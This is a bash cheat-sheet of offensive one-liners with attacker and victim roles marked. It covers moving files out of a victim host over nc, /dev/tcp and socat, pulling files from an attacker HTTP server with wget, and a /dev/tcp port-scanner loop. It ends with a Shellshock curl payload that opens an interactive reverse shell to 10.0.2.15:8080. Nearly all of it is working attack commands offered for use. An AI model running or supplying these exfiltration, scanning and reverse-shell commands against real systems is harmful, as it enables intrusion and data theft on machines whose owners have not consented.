#!/usr/bin/env bash

# File Transfer

# https://unix.stackexchange.com/questions/49936/dev-tcp-listen-instead-of-nc-listen

# Send to victim_host:
# On attacker_host:
cat ./foo | nc -l -q 1 -p 8998
# On victim_host:
cat < /dev/tcp/$target_ip/8998 > ./foo

# Send to attacker_host:
# On attacker_host:
nc -l -p 8998 -q 1 > ./foo < /dev/null 
# On victim_host:
cat ./foo > /dev/tcp/$target_ip/8998 0<&1 2>&1

# https://unix.stackexchange.com/questions/22308/socat-reliable-file-transfer-over-tcp

# Server sending file:
# On server:
socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr
# On client:
socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat

# Server receiving file:
# On server:
socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt
# On client:
socat -u FILE:test.txt TCP:127.0.0.1:9876

# Over http:
# On attacker_host:
python2 -m SimpleHTTPServer 8123
# ||
python3 -m http.server 8123
# On victim_host:
wget http://10.2.0.15:8123

# Port scanner
target_ip=
port=1
while [ $port -lt 1024 ]; do 
  echo > /dev/tcp/$target_ip/$port
  [ $? == 0 ] && echo $port "is open" >> /tmp/ports.txt
  port=$((port + 1))
done

# Read and write
exec 5<>/dev/tcp/$target_ip/8080; cat <&5 & cat >&5; exec 5>&-

# cgi written in bash
curl --head vulnerable --header 'Connection: close' --header 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/8080 0>&1"'

# TODO:
# - https://github.com/fijimunkii/bash-dev-tcp
